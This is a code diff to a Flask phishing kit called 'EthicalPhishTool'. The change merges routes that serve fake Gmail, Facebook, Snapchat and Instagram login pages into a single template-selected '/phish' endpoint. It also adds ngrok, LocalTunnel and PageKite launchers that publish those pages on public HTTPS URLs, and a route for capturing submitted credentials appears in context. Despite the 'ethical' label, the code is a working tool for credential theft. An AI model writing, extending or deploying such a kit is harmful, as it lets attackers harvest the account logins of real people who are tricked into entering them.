@@ -3,7 +3,7 @@ import sys
 import logging
 import subprocess
 from flask import Flask, render_template, request, redirect
-from pyfiglet import Figlet  # For ASCII art text
+from pyfiglet import Figlet
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -23,25 +23,13 @@ def display_banner():
 def home():
     return "Welcome to EthicalPhishTool. Use this tool responsibly!"
 
-@app.route('/gmail')
-def gmail_phish():
-    return render_template('gmail.html')
-
-@app.route('/facebook')
-def facebook_phish():
-    return render_template('facebook.html')
-
-@app.route('/paypal')
-def paypal_phish():
-    return render_template('paypal.html')
-
-@app.route('/snapchat')
-def snapchat_phish():
-    return render_template('snapchat.html')
-
-@app.route('/instagram')
-def instagram_phish():
-    return render_template('instagram.html')
+@app.route('/phish')
+def phish():
+    template = request.args.get('template')
+    if template in ['gmail', 'facebook', 'snapchat', 'instagram']:
+        return render_template(f'{template}.html')
+    else:
+        return "Invalid template selected."
 
 # Capture credentials
 @app.route('/capture', methods=['POST'])
@@ -74,15 +62,64 @@ def start_ngrok(port):
     print("Ngrok started. Check the terminal for the public URL.")
     return ngrok_process
 
+# Start LocalTunnel
+def start_localtunnel(port):
+    print("Starting LocalTunnel...")
+    localtunnel_process = subprocess.Popen(['npx', 'localtunnel', '--port', str(port)])
+    print("LocalTunnel started. Check the terminal for the public URL.")
+    return localtunnel_process
+
+# Start PageKite
+def start_pagekite(port):
+    print("Starting PageKite...")
+    pagekite_process = subprocess.Popen(['pagekite.py', str(port), 'your-subdomain.pagekite.me'])
+    print("PageKite started. Check the terminal for the public URL.")
+    return pagekite_process
+
 # Run the app
 if __name__ == '__main__':
     # Display CyberEagle banner
     display_banner()
 
+    # Prompt user to select a template
+    print("Select a phishing template:")
+    print("1. Gmail")
+    print("2. Facebook")
+    print("3. Snapchat")
+    print("4. Instagram")
+    choice = input("Enter the number of your choice: ")
+
+    # Map choice to template
+    templates = {
+        '1': 'gmail',
+        '2': 'facebook',
+        '3': 'snapchat',
+        '4': 'instagram'
+    }
+    selected_template = templates.get(choice, 'gmail')  # Default to Gmail if invalid choice
+
+    # Prompt user to select a server
+    print("\nSelect a server:")
+    print("1. Ngrok (Public HTTPS)")
+    print("2. LocalTunnel (Public HTTPS)")
+    print("3. PageKite (Public HTTPS)")
+    print("4. Localhost (Local Testing)")
+    server_choice = input("Enter the number of your choice: ")
+
     port = 5000
 
-    # Start Ngrok
-    ngrok_process = start_ngrok(port)
+    # Start the selected server
+    if server_choice == '1':
+        ngrok_process = start_ngrok(port)
+        print(f"Access the phishing page at: https://<ngrok-url>/phish?template={selected_template}")
+    elif server_choice == '2':
+        localtunnel_process = start_localtunnel(port)
+        print(f"Access the phishing page at: https://<localtunnel-url>/phish?template={selected_template}")
+    elif server_choice == '3':
+        pagekite_process = start_pagekite(port)
+        print(f"Access the phishing page at: https://<pagekite-url>/phish?template={selected_template}")
+    else:
+        print(f"Access the phishing page at: http://localhost:{port}/phish?template={selected_template}")
 
     # Start Flask app
     print("Starting Flask app...")
